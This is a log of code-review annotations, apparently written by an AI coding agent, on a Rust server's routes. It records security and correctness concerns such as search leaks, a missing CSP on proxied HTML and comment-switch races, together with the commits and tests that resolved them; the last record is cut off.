{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/tags.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T04:14:34.125746Z","id":"0c039ae3de8dd3f285ce4340c52ee7f613662a1af0c7263239050b0ed9aeb147","body":{"kind":"resolve","ref":"git:bffaeb4d0","summary":"Closed on the owner's decision of 2026-10-20 (\"Yes, as built\"); the contract states it (735162fc2) and api_tags::a_grant_of_the_owners_row_manages_tags_and_applies_them_anywhere passes (bazelisk test //crates/clax-server:all: integration groups PASSED)","supersedes":"b15019d566ef476c7a448d9183d0dfed17fd1c1b4bfab6dfd1a41b39b5458492","tags":["reason:fixed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T04:14:34.489886Z","id":"9b6c5af3a3d2d8d2f10aed73ddf1922c110cc9b11b343b9269bc31c76966068a","body":{"kind":"resolve","ref":"git:c7a3a5e29","summary":"Fixed in c7a3a5e29: tag_filter_ids returns at once when no tag is named, reading no tags; tags::tests::filters_match_all_and_unknown_tags_match_nothing checks the empty case (bazelisk test //crates/clax-store:clax_store_lib_test PASSED)","supersedes":"3ac5c4bfb8f56f15ea6aed4eae65c24ca5c90b156961d5aa4be0b523303e5da5","tags":["reason:fixed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/guards.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T05:10:59.368778Z","id":"94ea07b55a16b4c4ffeddaa8c4d504a67628b52453cb4cce75fb3ab83bbcd5a6","body":{"detail":"Moved from crates/clax-server/src/routes/mod.rs:1360:1376, record be332351. CONTENT_VIEWS and PEOPLE_VIEWS list the calls that build views in this codebase (thread_view(, with_owner(, list_versions(, doc_get(, working.for_artifact(, question_view(, inbox_views(, grant_view(, Sse::new(, ...). A handler that serialises an Artifact or a Version directly (json!({\"artifact\": a})) or calls a helper that does is not seen. MUST_REFUSE pins the routes spec §7.5 names.","kind":"concern","ref":"git:acb06db9","span":{"start":{"line":1269},"end":{"line":1310},"content_hash":"81457863f5a6f37f002514515cebebced86ea812b3069431a7be337d750945e9"},"summary":"The Own and not_for_agents guards recognise views by source text","supersedes":"7569f2b348f89c01745ac8448bfad8e6689d22b12f41b98fb3580ba278dc1d24","tags":["session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T05:10:59.626893Z","id":"2f04c4999724b4a12b23350c4226b17fd9d3ea2de8ff4ccc12a7839d099d4aeb","body":{"detail":"POST /api/artifacts is TokenOrAgent and takes any files: opening it to people's browsers would let a browser publish arbitrary HTML as a person, and the brief thread would be a second request the browser makes. POST /api/artifacts:new writes the placeholder itself (clax_core::brief::placeholder_html, the title escaped) and the brief thread in one store call, deleting the artifact when the thread cannot be written.","kind":"alternative","span":{"start":{"line":545},"end":{"line":758},"content_hash":"fa0dff614f32fa7639dbb94bc4294cc4972bbae6cf23b9365b6eea9fda3cc173"},"summary":"Let the browser publish the placeholder through POST /api/artifacts instead of a route of its own","supersedes":"4b0df7e358c11264950220b18a5948d9b47baa8e7c75ce2ded74f63795cf705a","tags":["revisit:the gallery lets people paste or upload a page of their own","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T05:10:59.908212Z","id":"72a7cc96f6a886d2366bdd873c26a901730d7b4a516529083085a91ec10667bd","body":{"detail":"The brief is written with announce_new_thread(mention=false, named=None): an @ in it sends nothing. The dialog's picker is the one way the brief reaches an agent, so a refused @name (agent_cannot_read) can never fail the artifact's creation after it was made.","kind":"alternative","span":{"start":{"line":545},"end":{"line":758},"content_hash":"fa0dff614f32fa7639dbb94bc4294cc4972bbae6cf23b9365b6eea9fda3cc173"},"summary":"Act on @agent and @name in the brief as in any viewer comment","supersedes":"31ffec38d7a3b59c3fb9cee6c8b00ea4eb1c283d242efac1a5b06b188ae294a1","tags":["revisit:people write @name in briefs expecting it to send","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T05:11:00.153807Z","id":"3177a14a5695a4108e9986ca88eb7d9a583b74f91eed1878a5f1a6abd5feecd1","body":{"detail":"Live seats are per artifact (docs/contract.md 'Live seats and spectators'); there is no gallery-wide spectator state. A new artifact is its maker's, so their seat there is reserved (clax_http::seats::claim_for: created_by), and they write and send its brief. brief_refusal checks the person's rights (create, read own, comments write) and refuses guests, but no seat. tests api_hosted::people_start_artifacts_from_briefs_and_guests_may_not shows Kim, a spectator on Plan, creating. If 'spectators may not create' means something else (for example refusing a person who is a spectator anywhere right now, or capping creation while seats are full), that needs a rule the seat model does not have yet.","kind":"concern","span":{"start":{"line":503},"end":{"line":543},"content_hash":"944402e3165facbab6912aad6318d25b794299c1ea36153448de34b07ae465d1"},"summary":"Spectators: a person beyond another artifact's live seats may start an artifact from a brief","supersedes":"9493ceda30192579dec2fb9edabdda948c8bb30d5d07fa610bcf3c1075b00a1d","tags":["status:needs-decision","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T05:11:03.133949Z","id":"3c85e722ff06002115356374ee5989cc7a41a7384a71d63d2e3b0b11006cdde9","body":{"detail":"GET /api/inbox?q= searches inbox_fts, whose text holds each reply's body (crates/clax-core/src/store/inbox.rs insert_at). Since 60859f1e a person who may not read an artifact's comments gets its reply items without body or summary, but a search still returns or omits those items by their text, and total counts them, so the text can be probed word by word.","kind":"concern","span":{"start":{"line":408},"end":{"line":416},"content_hash":"91f89f3d77eba6ccfc5af1ec0a4e990eca0e6ff55f4ad7288d5505261f120e6b"},"suggested_fix":"On a hosted daemon, leave out of a text search the items of artifacts whose comments the recipient may not read (filter the matched rows with inbox::reads_comments before paging, or keep text searches to items whose artifact they read comments at).","summary":"A hosted person's inbox search matches reply text they may no longer read","supersedes":"ee7bd7d39416df5c010d341525cd72a68e365e43fafae2110aa998520c4c8f04","tags":["hosted","security","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T05:11:03.356436Z","id":"c3ff957e4c62a97240f262cda556d40673ff2fb0fadce70f499cdf901513ef4b","body":{"detail":"With ?tag=, questions are kept by reading their artifact's tags one get_artifact per distinct artifact (memoised per request), up to SUMMARY_QUESTIONS (200) questions. Cheap at today's sizes; a query joining questions to artifact_tags would avoid it.","kind":"concern","span":{"start":{"line":497},"end":{"line":524},"content_hash":"2d5f186dac7da0c4edc442db10549d87d4697e441d42fecdbcaaad6b18181aad"},"summary":"The inbox summary's tag filter reads each open question's artifact","supersedes":"65ffeeb81097bda53069023f5e2ea5bfe376e8b1a14cd1eb151c1e8de80a13e4","tags":["perf","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/questions.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T15:49:14.172213Z","id":"c3b502616612e7f38b25543a660776060da381b6bcbb9fdb6979900f4e121c63","body":{"detail":"Live seats refuse every artifact write a person makes as themselves (threads, db, room). POST /api/questions/<qid>/answer and decline, and PUT /api/viewers/me/seen and looked, are not seat-checked: a question is the person's exchange with their own agent and not an artifact write, and seen and looked are the viewer's private marks. Decide whether 'read only' covers them.","kind":"concern","span":{"start":{"line":761},"end":{"line":761},"content_hash":"0ae91d3100d18ff23c480c4637c371f61a5eef5ffa3c280690c00ad759664cc0"},"summary":"Answering one's own agent's question, and the seen and looked marks, are not refused to a spectator","supersedes":"a084d9827c5f5406ec88bcfb1804381217cfe68d03054afa0577d06b1d6037cd","tags":["live-seats","status:needs-decision","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remotes.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T08:16:04.114742Z","id":"0e6dab3aa96eefd2cca255062540aeee238043aa24d833aa39dfaea72da081af","body":{"detail":"Failure: Connect in the Clax app (apps/clax_app/lib/ui/remote/connect_sheet.dart through HttpRemoteApi.addRemote, apps/clax_app/lib/remote/remote_api.dart) sends {url, kind: \"clax-app\", machine}; AddBody is #[serde(deny_unknown_fields)] with url, name and machine only, so every sign-in from the app is refused 400 before it starts. The store keeps device_codes.client_kind (crates/clax-store/src/device.rs CLAX_APP_KIND), but neither AddBody, public::start_sign_in (crates/clax-server/src/public.rs, which posts only client_name) nor hosted.rs DeviceCodeBody carry the kind to it.","kind":"blocker","span":{"start":{"line":100},"end":{"line":113},"content_hash":"fadc2dc0bf8365eefee6b06e952b3d144ca9de78b9d7881ab5ae9f92de96783a"},"suggested_fix":"Accept `kind` in AddBody, pass it through start_sign_in to POST /api/hosted/device/code, and store it as client_kind; or drop `kind` from HttpRemoteApi.addRemote until the routes take it.","summary":"POST /api/remotes refuses the Clax app's sign-in: AddBody has no `kind` and denies unknown fields","tags":["area:remote","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/app_bundles.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T07:39:58.685562Z","id":"d4e1ff5e0698dff07acaf2d5226b23de4ad1f12e012da3f8ecad1d432893e551","body":{"detail":"published_by and owner ({name, login}) come from Store::person_card for any caller who may read the artifact, including a visitor through its link and a person's agent whose Visibility has not approved those people. The spec (2026-10-21-app-push-pull §5.5, §5.7) shows the publishing account on the public page, so the names are treated as public to readers; the title and content_sha256 do go through vis.filter_artifact and vis.filter_version.","kind":"concern","span":{"start":{"line":272},"end":{"line":315},"content_hash":"fd13f78521f8567f6cc7a5d89cc8017b0a56b0da1c1d37f23a11dcb0c58ba91c"},"summary":"The head and the artifact JSON's app name the publisher and the owner to every reader, agents of other people included, unfiltered","tags":["app-push","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T07:39:58.685781Z","id":"6abb99da5a374f76aaaf310bd2458d9cc7fab9829ac7cf2342e4c465fc124ec1","body":{"detail":"refuse_comments_off reads Store::comments_on in its own store call; create_thread_keyed_now and add_comment_keyed write later in their own transactions. A comment already past the check when the owner turns comments off is written. Checking inside the write transactions would close it.","kind":"concern","span":{"start":{"line":754},"end":{"line":766},"content_hash":"6531c3028a1a372fd14e9c682448fcd020ca2b53978cb910a1d9353c7fb7640a"},"summary":"The Comments switch is read before the comment's transaction, not inside it: a comment racing the switch being turned off can land","tags":["app-push","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/app_bundles.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T08:37:25.427776Z","id":"817a48614b7e8f0e32e11da22b516493f17ae26c4ee116787932cef309dad651","body":{"detail":"put_bundle takes any non-empty header text as the lineage. The first bundle of an artifact fixes it for every later one (crates/clax-store/src/app_bundles.rs check_bundle, bundle_lineage), the head serves it to every reader, and get_bundle echoes it as a response header. A lineage of tens of KiB (as large as the server's header buffer allows) is kept in app_bundles and repeated in every head answer.","kind":"concern","span":{"start":{"line":145},"end":{"line":145},"content_hash":"900be86006fa88f691aa2a8deec56d4be7f2e60f59987bc354ddf3643908038f"},"suggested_fix":"Refuse a lineage that is not the app's lineage format (the bundle manifest's), or at least cap it (for example 128 bytes of [A-Za-z0-9_-]) with 400 invalid_args.","summary":"clax-bundle-lineage is stored and served back with no check of its shape or length","tags":["review","app-push","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/jobs.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T08:37:25.428199Z","id":"722474199a21e020dda07f58fa21998f605c4f38279252bafe21fbf9c451f3cf","body":{"detail":"PublishBody.request is a PublishRequest, which now has comments. A step that creates an artifact (artifact_id absent) validates it with validate(p.request), which does not carry comments into ValidatedPublish, so {\"comments\": false} is accepted and the artifact is made with comments on. POST /api/artifacts/<aid>/versions refuses the field (crates/clax-server/src/routes/artifacts.rs publish); this route neither honours nor refuses it.","kind":"concern","span":{"start":{"line":528},"end":{"line":540},"content_hash":"f97f1ec52d1d81cd97f67808296b43def0443b5db68aa89dc0ff50037c7333f6"},"suggested_fix":"Refuse comments in a job step with 400 invalid_args, as publish does, or carry it into the create.","summary":"A job's publish step accepts PublishRequest.comments and drops it","tags":["review","app-push","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T09:06:34.339233Z","id":"b81ca3f81b192830187f8dd892cad09667e8e5d356b7ef63a4af1fb4cb16e983","body":{"kind":"resolve","ref":"git:061acb3e0","summary":"The switch is now read in the write transaction (crates/clax-store/src/threads.rs refuse_comments_off_in, called in create_thread_inner and add_comment_keyed_in after the Idempotency-Key lookup); the route pre-check is gone. api_app_bundles::a_keyed_resend_answers_what_it_made_after_comments_go_off passes (bazel test //crates/clax-server:integration__4), and fails at api_app_bundles.rs:731 with the pre-transaction read restored in the comment route, and at :734 with the store check moved before the key lookup.","supersedes":"6abb99da5a374f76aaaf310bd2458d9cc7fab9829ac7cf2342e4c465fc124ec1","tags":["reason:fixed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/app_bundles.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T09:06:34.420379Z","id":"8d8b5df9a8f08e1b5d254f0425d6b4f7491816df7eb505672241b8b05657069b","body":{"kind":"resolve","ref":"git:061acb3e0","summary":"put_bundle refuses a clax-bundle-lineage that is not l_ and 26 lowercase base32 characters (is_lineage, matching _lineageRe in apps/clax_app/lib/bundle/manifest.dart). routes::app_bundles::tests::a_lineage_is_l_and_26_base32_characters and api_app_bundles::bundle_put_refuses_hash_mismatch pass; the latter fails at api_app_bundles.rs:510 with the check disabled.","supersedes":"817a48614b7e8f0e32e11da22b516493f17ae26c4ee116787932cef309dad651","tags":["reason:fixed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/jobs.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T09:06:34.503905Z","id":"0fbd9c8d7779e0158cc26c0ab360eb5b1f01cef93243b52abe58eb515d5f4344","body":{"kind":"resolve","ref":"git:061acb3e0","summary":"A job's publish step refuses PublishRequest.comments with 400 invalid_args (crates/clax-server/src/routes/jobs.rs). api_jobs::a_publish_step_carrying_comments_is_refused_and_records_nothing passes, and fails at api_jobs.rs:215 with the refusal disabled.","supersedes":"722474199a21e020dda07f58fa21998f605c4f38279252bafe21fbf9c451f3cf","tags":["reason:fixed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T09:12:28.953342Z","id":"d7f056b3e02bac6052a3478b2d97125cb720fdf126452304bfbce881f8a91ec1","body":{"detail":"create accepts comments on every daemon, not only a hosted one. The only route that turns the switch back on is PUT /api/hosted/artifacts/<aid>/comments (crates/clax-server/src/hosted.rs put_comments), mounted on a hosted Clax alone. Since the switch is now enforced in the store's thread and comment transactions (crates/clax-store/src/threads.rs refuse_comments_off_in), an owner's agent that sends comments: false to a local daemon or the in-process core leaves that artifact refusing every thread, reply and agent reply (MCP comments_reply, job reply steps) for good. Mirroring a remote's comments into a local linked thread is not affected: crates/clax-store/src/linked.rs inserts those rows directly.","kind":"concern","span":{"start":{"line":447},"end":{"line":450},"content_hash":"1e47ed4185711884ee52ca095d0d9441aa800ef37a6947d42af7243228b9e43e"},"suggested_fix":"Refuse comments on POST /api/artifacts outside hosted mode (400 invalid_args), or give the local daemon a route to set the switch.","summary":"On a local daemon, POST /api/artifacts with comments: false makes an artifact no one can ever comment on again","tags":["review","app-push","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remotes.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T10:22:47.471013Z","id":"219b840cc877e38a6e22f51bba9c24ab499643e2821d2037b3e2660f5e837fb5","body":{"kind":"resolve","ref":"git:4d8c70f3f","summary":"AddBody takes kind (clax-app alone) and start_sign_in sends it to the remote as client_kind: api_remotes::a_clax_app_sign_in_names_its_kind_to_the_remote passes (POST /api/remotes {url, kind: \"clax-app\", machine} is 201, the remote's peek shows client_kind clax-app, and the issued grant is_person_device_grant); bazelisk test //crates/clax-server:all PASSED","supersedes":"0e6dab3aa96eefd2cca255062540aeee238043aa24d833aa39dfaea72da081af","tags":["reason:fixed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T10:22:49.142662Z","id":"f5a09e85a089823ea732a161b365ef3f24ca763697687573443cddf1e142dfe3","body":{"kind":"resolve","ref":"git:4229c68e0","summary":"create refuses comments 400 invalid_args when s.hosted is None: api_app_bundles::a_local_daemon_takes_no_comments_switch_on_create passes (comments false and true both refused on a local TestServer, nothing created), and fails with the check removed","supersedes":"d7f056b3e02bac6052a3478b2d97125cb720fdf126452304bfbce881f8a91ec1","tags":["reason:fixed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T11:16:54.912750Z","id":"89e62839a792f7d8559410d29866842de15cc660601e9021c4a6586108d90367","body":{"detail":"Spec 2026-10-21-app-push-pull D4a: while the switch is off \"nobody can comment, whatever their access, so Can comment acts as Can view\". Can view grants comments read and watch only; Can comment adds write, reply and send (crates/clax-store/src/shares.rs:76-79, crates/clax-store/src/hosted.rs:100-103 for link access). The Comments switch is checked only on thread creation and on adding a comment (crates/clax-store/src/threads.rs refuse_comments_off_in, called at lines 912 and 1394), so send here and send_batch (line 1461) still take a commenter's send. The web now shows that commenter Send to <agent> and the Send N unsent bar while comments are off (web/shell/src/ui/ShellSidebar.svelte passes noReply, not readOnly, to every viewer who is not a spectator; the shell has no notion of the viewer's role). Failure: the owner shares a page by link at Can comment, a guest leaves threads, the owner turns Comments off; the guest can still press Send to <agent> on each open thread and the daemon accepts it (the approval rules still withhold the text of authors the owner has not approved). Resolve is unaffected: commenters lack it on or off.","kind":"concern","span":{"start":{"line":1268},"end":{"line":1270},"content_hash":"8efc0e4a0d6815117054ed7ea155bea7e5afb46b5d8914b355bd475dd1cdf50b"},"suggested_fix":"If send counts as commenting under D4a: in send and send_batch, refuse comments_off unless the caller's access to the artifact includes resolve (the owner, its maker, Can edit), with a test in crates/clax-server/tests/api_app_bundles.rs beside comments_off_refuses_owner_commenter_guest_and_reply; the web then shows the refusal through failureText. If it does not, record that reading of D4a in the spec.","summary":"While Comments is off, someone with Can comment can still send threads to the owner's agent, though D4a says Can comment then acts as Can view","tags":["app-push","review","status:needs-decision","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T12:35:48.340414Z","id":"7bacced96dc1af0268940db219d99eb1edc0ac7a18ba14057d98b1d94f3f1010","body":{"kind":"comment","references":"89e62839a792f7d8559410d29866842de15cc660601e9021c4a6586108d90367","summary":"Fixed as D4a reads: a commenter's send is refused while Comments is off. Commit 28b7f14ab: send and send_batch (crates/clax-server/src/routes/threads.rs) call refuse_send_comments_off in their store call, which answers 403 comments_off while the switch is off unless resolves() says the caller's access includes resolve (owner and owner's agents; a person's agent or hosted member whose rights allow comments resolve, i.e. maker or Can edit; anyone on a local daemon; never a hosted link guest). Tests in crates/clax-server/tests/api_app_bundles.rs: comments_off_refuses_a_commenters_send (a link guest and a Can comment member are refused on send and send_batch while off; the guest sends both while on) and comments_off_keeps_the_owners_send (the owner's browser and the owner's token send while off). comments_off_refuses_a_commenters_send fails with the refusal disabled (target/t6c-mut-integration4.log, api_app_bundles.rs:929); comments_off_keeps_the_owners_send fails with the Owner arm of resolves() returning false (target/t6c-mut2-integration4.log, :961). The web shows 'Could not send to the agent: comments are off for this page' for a refused single or batch send (web/shell/src/topbar.test.ts 'a send refused comments_off … says so'). just test-affected d523321fd: 111 tests pass (target/t6c.log).","tags":["session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T12:35:48.340872Z","id":"8da51b31545a58c20cc82042a7fd00b3cb52b337805960dd9ac3f99aaf44f505","body":{"kind":"resolve","ref":"git:28b7f14ab","summary":"Send and batch send refuse comments_off unless the caller may resolve. Commit 28b7f14ab: send and send_batch (crates/clax-server/src/routes/threads.rs) call refuse_send_comments_off in their store call, which answers 403 comments_off while the switch is off unless resolves() says the caller's access includes resolve (owner and owner's agents; a person's agent or hosted member whose rights allow comments resolve, i.e. maker or Can edit; anyone on a local daemon; never a hosted link guest). Tests in crates/clax-server/tests/api_app_bundles.rs: comments_off_refuses_a_commenters_send (a link guest and a Can comment member are refused on send and send_batch while off; the guest sends both while on) and comments_off_keeps_the_owners_send (the owner's browser and the owner's token send while off). comments_off_refuses_a_commenters_send fails with the refusal disabled (target/t6c-mut-integration4.log, api_app_bundles.rs:929); comments_off_keeps_the_owners_send fails with the Owner arm of resolves() returning false (target/t6c-mut2-integration4.log, :961). The web shows 'Could not send to the agent: comments are off for this page' for a refused single or batch send (web/shell/src/topbar.test.ts 'a send refused comments_off … says so'). just test-affected d523321fd: 111 tests pass (target/t6c.log).","supersedes":"89e62839a792f7d8559410d29866842de15cc660601e9021c4a6586108d90367","tags":["reason:fixed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T13:36:33.070669Z","id":"7aa1fe6949f4b15670501f496c1fba2873ca560bd6d5b978cf6aa07bd09ad917","body":{"detail":"resolves() lets a hosted member or a person's agent send while the switch is off when also_needs grants comments resolve (the Ok(()) => Ok(true) arm at line 187). crates/clax-server/tests/api_app_bundles.rs covers only the refusals (comments_off_refuses_a_commenters_send: a link guest and a Can comment member) and the owner (comments_off_keeps_the_owners_send: the owner's browser and token). Changing line 187 to Ok(()) => Ok(false), which refuses every Can edit member, maker and agent of another person's machine while comments are off, leaves `just test` green (41 of 41 Rust test targets pass). A regression there would stop editors from sending existing threads to their agents, which D4a and §5.6 leave to whoever's role allows it.","kind":"concern","span":{"start":{"line":172},"end":{"line":191},"content_hash":"3dd117bc65173e8210529a6aacbfa84a8be5b80977da6829d82f6cd0ea671358"},"suggested_fix":"In comments_off_keeps_the_owners_send (or beside it), share the artifact with a member at Can edit and assert their send and batch send answer 200 while Comments is off; and the same for a person's agent whose rights include comments resolve on the artifact.","summary":"No test pins that an editor, the maker or a person's agent with resolve may still send while Comments is off","tags":["app-push","tests","review","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remote_apps.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:18:42.760844Z","id":"529bbf6c0e5682c80986f90ab0b6620f65124a4c91dcb916ff7cf5f15d3567a3","body":{"detail":"comment forwards POST /api/artifacts/<raid>/threads with no Idempotency-Key header, and the Clax app's RemoteApi.comment (apps/clax_app/lib/remote/remote_api.dart) sends none either. crates/clax-server/src/routes/threads.rs comment_key honours a key for a person's agent, so forwarding a client-chosen key (or deriving one from the body and a client nonce) would make a retry replay the first thread.","kind":"concern","span":{"start":{"line":703},"end":{"line":722},"content_hash":"fa1c784565fd28db4599642727e1aedc01d1fa6fea64ed5d5547bdaf161b3093"},"summary":"A comment posted through the core carries no Idempotency-Key: an answer lost on the way back and retried posts the comment twice on the public copy","tags":["app-push","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/app_bundles.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:18:42.760928Z","id":"b2d73d0f8ce86cb63588b1f94e26631b53057a78aa3341be7513477e4457b268","body":{"detail":"GET /api/artifacts/<aid>/head answers artifact_id, url, title, version, content_sha256, published_by, owner, comments and bundle; the current version's note (and label) are not in it. The core's head proxy (crates/clax-server/src/routes/remote_apps.rs head) passes the remote's body whole (api_remotes_app::proxies_forward_head_bundle_files_sharing_apps compares it with the remote's own answer), so a note added here reaches the app unchanged. Until then the app reads it from GET /api/remotes/<rid>/artifacts/<raid>/versions/<n>/files, which answers the version JSON with its note.","kind":"concern","span":{"start":{"line":341},"end":{"line":349},"content_hash":"c278390a7c7a59b81167d9db4422646dd5b7942964df05dbebab0fc4fa71ed01"},"summary":"The public head carries no version note, so a client's diverged sheet cannot show what the public version says about itself without a second read","tags":["app-push","status:needs-decision","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remote_apps.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:58:52.213692Z","id":"f48025d1624fdd9d695a630c67924f13d622c64df303709af87961bb95ad4400","body":{"detail":"Failure: GET /api/remotes/<rid>/artifacts/<raid>/versions/<n>/files/x.html (version_file, remote_apps.rs:406-434) answers 200 text/html with no CSP and no nosniff; the same file read directly from the remote (crates/clax-server/src/routes/content.rs raw_file) answers text/html with CSP sandbox, whose doc says it is sandboxed because it shares the API's origin. Client::forward keeps only content-type, content-disposition and the bundle headers (crates/clax-server/src/public.rs FORWARDED_HEADERS), and answer() adds only Cache-Control. Opened in a browser on this daemon's origin (rid may be the remote's name, push_target in routes/remotes.rs), a file an editor, a web edit or an agent wrote runs as the owner's page: it can read GET /api/token and every owner route. Fetch Metadata keeps a cross-site navigation from carrying the owner cookie (crates/clax-http/src/identity.rs Identity::of, cookies_count), so the remaining routes are a browser without Sec-Fetch-Site and any same-origin link to the URL. Probed with a scratch test (status 200, content-type text/html, CSP None) and reverted.","kind":"concern","span":{"start":{"line":126},"end":{"line":147},"content_hash":"41156e02f7496fbaab9dd2257a900018384be187db17db63ec6f25e0753d9ab7"},"suggested_fix":"In answer(), always set Content-Security-Policy: sandbox; default-src 'none' and X-Content-Type-Options: nosniff, as assets.rs send_blob and content.rs raw_file do for bytes on the API origin; a test that version_file of an HTML file carries both.","summary":"The remote-app proxies answer a public copy's bytes on the API origin without the Content-Security-Policy: sandbox and X-Content-Type-Options: nosniff the remote's own file route sets, so remote-authored HTML runs on the owner's origin when opened","tags":["review","security","app-push","severity:important","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:58:52.214304Z","id":"a359794c4cd004c71bf3cbd6409bcccbfe6864c8ca7a866aff0f6a379a257fb2","body":{"detail":"Agent::also_needs (crates/clax-http/src/agent.rs 872-889) checks a PersonAgent caller with allowed_at (agent.rs 1036-1052), which reads only the grant's rights; MemberRights::allows_at (crates/clax-http/src/hosted.rs 850-867) also admits the artifact's link access. The Clax app's core pushes with its device token (a PersonAgent), so POST /api/artifacts {forked_from} of a source the person reads only by its link answers 403. A missing source and an unreadable one both answer 403 for a caller without broad read rights, so there is no existence leak. api_remotes_app::app_push_of_a_new_copy_records_forked_from covers a person share, not link access.","kind":"concern","span":{"start":{"line":466},"end":{"line":473},"content_hash":"33f397dedd34717bb36f6aa1eff8997c4aabf7c3a33f4ada01c2def797b45b44"},"summary":"forked_from's read check ignores the source's link access for a person's agent or device, so an 